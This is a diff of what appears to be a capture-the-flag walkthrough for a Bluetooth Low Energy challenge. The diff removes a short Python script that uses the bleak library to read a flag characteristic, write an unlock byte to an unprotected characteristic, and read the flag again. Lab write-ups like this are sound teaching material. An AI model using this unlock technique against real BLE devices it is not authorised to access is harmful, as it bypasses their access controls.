@@ -127,34 +127,6 @@ Tap the **↓ (read)** button on the READ characteristic again. The value will n
 
 ---
 
-## Alternative: Python Script
-
-```python
-import asyncio
-from bleak import BleakClient
-
-MAC = "AA:BB:CC:DD:EE:FF"
-FLAG_CHAR   = "abcdef02-0000-1000-8000-00805f9b34fb"
-UNLOCK_CHAR = "abcdef03-0000-1000-8000-00805f9b34fb"
-
-async def main():
-    async with BleakClient(MAC) as client:
-        # First read (should be denied)
-        value = await client.read_gatt_char(FLAG_CHAR)
-        print("Before unlock:", value.decode())
-
-        # Unlock
-        await client.write_gatt_char(UNLOCK_CHAR, bytes([0x01]))
-
-        # Second read (flag)
-        value = await client.read_gatt_char(FLAG_CHAR)
-        print("After unlock:", value.decode())
-
-asyncio.run(main())
-```
-
----
-
 ## 🎯 Flag
 
 ```
